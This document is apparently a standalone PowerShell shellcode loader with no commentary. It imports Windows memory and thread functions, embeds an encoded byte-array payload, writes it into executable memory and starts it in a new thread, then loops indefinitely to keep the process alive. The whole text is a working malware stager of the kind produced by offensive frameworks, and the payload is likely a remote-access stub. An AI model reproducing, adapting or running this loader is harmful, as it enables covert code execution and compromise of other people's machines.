
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xbd,0xda,0x02,0x3a,0xc8,0xb1,0x59,0x31,0x68,0x19,0x83,0xe8,0xfc,0x03,0x68,0x15,0x38,0xf7,0xc6,0x20,0x3e,0xf8,0x36,0xb1,0x5e,0x70,0xd3,0x80,0x5e,0xe6,0x97,0xb3,0x6e,0x6c,0xf5,0x3f,0x05,0x20,0xee,0xb4,0x6b,0xed,0x01,0x7c,0xc1,0xcb,0x2c,0x7d,0x79,0x2f,0x2e,0xfd,0x83,0x7c,0x90,0x3c,0x4c,0x71,0xd1,0x79,0xb0,0x78,0x83,0xd2,0xbf,0x2f,0x34,0x56,0xf5,0xf3,0xbf,0x24,0x18,0x74,0x23,0xfc,0x1b,0x55,0xf2,0x76,0x42,0x75,0xf4,0x5b,0xff,0x3c,0xee,0xb8,0xc5,0xf7,0x85,0x0b,0xb2,0x09,0x4c,0x42,0x3b,0xa5,0xb1,0x6a,0xce,0xb7,0xf6,0x4d,0x30,0xc2,0x0e,0xae,0xcd,0xd5,0xd4,0xcc,0x09,0x53,0xcf,0x77,0xda,0xc3,0x2b,0x89,0x0f,0x95,0xb8,0x85,0xe4,0xd1,0xe7,0x89,0xfb,0x36,0x9c,0xb6,0x70,0xb9,0x73,0x3f,0xc2,0x9e,0x57,0x1b,0x91,0xbf,0xce,0xc1,0x74,0xbf,0x11,0xaa,0x29,0x65,0x59,0x47,0x3e,0x14,0x00,0x00,0xae,0x42,0xcf,0xd0,0x46,0xfa,0x46,0xbf,0xff,0x50,0xf1,0x73,0x88,0x7e,0x06,0x73,0xa3,0x4e,0xd3,0xd8,0x18,0xe2,0xb0,0x8d,0xf6,0x3e,0x61,0x4b,0xa1,0xc0,0x58,0xf8,0xfe,0x54,0x60,0xac,0x53,0xc1,0xdd,0x53,0x53,0x11,0xca,0xde,0x53,0x11,0x0a,0xf0,0x64,0x5b,0x48,0x4a,0xdf,0x5b,0x1c,0x3a,0x88,0xd2,0x03,0x7c,0xc9,0x30,0xb2,0x47,0x66,0xd3,0xc5,0x75,0x68,0xa7,0x95,0x2a,0x3b,0xff,0x4a,0x9b,0xd3,0x14,0x39,0x0d,0x18,0x14,0x17,0xc7,0x34,0xe0,0xc7,0x80,0x48,0xc7,0xf7,0x50,0xc1,0xc8,0x92,0x54,0x81,0x62,0x7c,0x03,0x49,0x06,0xc4,0x35,0x0f,0x17,0x1d,0x1a,0x5c,0xbb,0xcd,0xcb,0x0a,0x16,0xf4,0xeb,0xb1,0x97,0x2d,0x8e,0x85,0x1d,0xc6,0xde,0x70,0x07,0x3e,0xab,0x7a,0xb7,0xbf,0x46,0x3a,0xdf,0xbf,0x86,0xba,0x1f,0xa8,0xa6,0xba,0x5f,0x28,0xf4,0xd2,0x07,0x8c,0xa9,0xc7,0x47,0x19,0xde,0x54,0xeb,0x2b,0x06,0x0d,0x63,0x2c,0xe9,0xb1,0x73,0x7f,0xbf,0xd9,0x61,0xe9,0xb6,0xfb,0x79,0xc0,0x4c,0x3b,0xf1,0x24,0xc5,0xbc,0xfb,0x79,0x5f,0x02,0x8e,0x98,0x38,0x41,0x2e,0x8b,0xce,0xba,0x2e,0xb4,0x03,0x75,0xe7,0x65,0x56,0x47,0x31,0x54,0xa2,0x94,0x13,0x9a,0xfb,0xe9,0x6b,0x61,0x0b,0xb8,0xce,0xc3,0x86,0xc2,0x5d,0x13,0x83;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
